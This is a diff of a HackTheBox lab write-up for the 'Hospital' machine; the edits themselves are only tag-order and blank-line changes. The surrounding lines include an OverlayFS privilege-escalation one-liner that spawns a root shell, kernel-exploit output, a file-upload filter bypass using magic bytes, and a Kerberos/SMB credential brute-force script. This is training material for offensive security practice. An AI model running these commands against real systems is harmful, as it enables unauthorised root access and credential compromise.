@@ -2,7 +2,7 @@
 render_with_liquid: false
 title: HackTheBox Writeup - Hospital
 date: 2023-11-20 02:38:58 +1400
-tags: [hackthebox, nmap, windows, linux, hyper-v, crackmapexec, kerbrute, php, burpsuite, file-upload, file-upload-bypass, ffuf, php-disable-functions-bypass, phpsploit, webshell, kernel-exploit, cve-2023-2640, cve-2023-32629, hashcat, password-reuse, roundcube-webmail, ghostscript, cve-2023-36664, reverse-ssh, discover-secrets, clear-text-credentials, cve-2023-35001, smartbrute, evil-winrm]
+tags: [hackthebox, nmap, windows, linux, hyper-v, crackmapexec, kerbrute, php, burpsuite, file-upload, file-upload-bypass, ffuf, php-disable-functions-bypass, phpsploit, webshell, kernel-exploit, cve-2023-2640, cve-2023-32629, hashcat, password-reuse, roundcube-webmail, ghostscript, cve-2023-36664, discover-secrets, clear-text-credentials, reverse-ssh, cve-2023-35001, smartbrute, evil-winrm]
 image:
     path: https://labs.hackthebox.com/storage/avatars/e980d18b909fa0ba8f519cf9777fd413.png
     width: 640
@@ -36,7 +36,6 @@ sudo $(which autorecon) -vv hospital.htb --global.domain hospital.htb
 ## Nmap
 
 ```bash
-
 # Nmap 7.94SVN scan initiated Mon Nov 20 02:38:58 2023 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 53,135,139,389,443,445,464,593,636,1801,2103,2105,2107,2179,3268,3269,3389,5985,6404,6406,6407,6409,6613,6619,6639,8080,9389 hospital.htb
 Nmap scan report for hospital.htb (10.129.40.48)
 Host is up, received user-set (0.27s latency).
@@ -278,7 +277,6 @@ Host script results:
 
 Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-
 # Nmap done at Mon Nov 20 02:40:52 2023 -- 1 IP address (1 host up) scanned in 113.61 seconds
 ```
 
@@ -580,6 +578,7 @@ Changing the mime type doesn't bypass the check
 ### File upload bypass at port 8080
 
 > **Common methods for file upload bypass**
+> 
 > - [Extensions](https://book.hacktricks.xyz/pentesting-web/file-upload#file-upload-general-methodology)
 > - Content-Type (Wordlist for fuzzing : `/usr/share/seclists/Miscellaneous/web/content-type.txt`)
 > - Magic bytes (`echo "89 50 4e 47 0d 1a 0a" | xxd -p -r > rev.php`)
@@ -943,7 +942,6 @@ Use my oneliner (https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/commi
 
 ```bash
 www-data@webserver:/var/www/html/uploads$ export TD=$(mktemp -d) && cd $TD && unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);d=os.getenv("TD");os.system(f"rm -rf {d}");os.chdir("/root");os.system("/bin/sh")'
-
 # id
 uid=0(root) gid=33(www-data) groups=33(www-data)
 ```
@@ -997,6 +995,7 @@ There's one mail asking for `drwilliams` (Lucy Williams) to send back a design f
 ![](/assets/obsidian/1ec64e3e04cd243c3d1b3dd0adb6ef61.png)
 
 > **What is an EPS file?**
+> 
 > EPS is a [vector file format](https://www.adobe.com/creativecloud/file-types/image/vector.html) often required for professional and high-quality image printing. PostScript printers and image setters typically use EPS to produce vast, detailed images
 {: .prompt-info }
 
@@ -1284,7 +1283,6 @@ www-data@webserver:/tmp/CVE-2023-35001$ ./exploit
 [+] Recovering kernel base
 [+] Kernel base: 0xffffffff91200000
 [+] Got root !!!
-
 # id
 uid=0(root) gid=0(root) groups=0(root)
 ```
@@ -1566,14 +1564,11 @@ Before running the tool, we'll have to do some tweaks
 ```bash
 cd /opt/sectools/web/Bypasses/Upload_Bypass
 
-
 # Flollow all redirections
 find lib/ -type f -exec sed -i 's/allow_redirects=False/allow_redirects=True/g' {} +
 
-
 # Don't base64 encode file content
 find lib/ -type f -exec sed -i 's/file_data_new = base64.b64encode(file_data_new)//g' {} +
-
 
 # Replace webshell source to phpinfo
 echo '<?php phpinfo(); ?>' > assets/webshell.php
@@ -1635,31 +1630,23 @@ Write a script to brute force all known entries that requires credentials
 > `brute.sh`
 
 ```bash
-
 #!/bin/bash
-
 
 # Wordlist
 cat creds.lst | cut -d ":" -f 2 > passwords.lst
 cat creds.lst | cut -d ":" -f 1 > users.lst
 hashcat --force --stdout passwords.lst -r /usr/share/hashcat/rules/best64.rule > passwords_b64.lst
 
-
 # AD
-
 ## Gathered credentials
 /opt/sectools/ad/smartbrute/smartbrute.py brute -bU users.lst -bP passwords_b64.lst kerberos -d hospital.htb
-
 ## Username as password
 /opt/sectools/ad/smartbrute/smartbrute.py brute -bU users.lst --user-as-password kerberos -d hospital.htb
-
 ## Null passwords
 /opt/sectools/ad/smartbrute/smartbrute.py brute -bU users.lst -bp '' kerberos -d hospital.htb
 
-
 # SMB (Local)
 cme smb hospital.htb -u users.lst -p passwords.lst --local-auth
-
 
 # Web
 ```
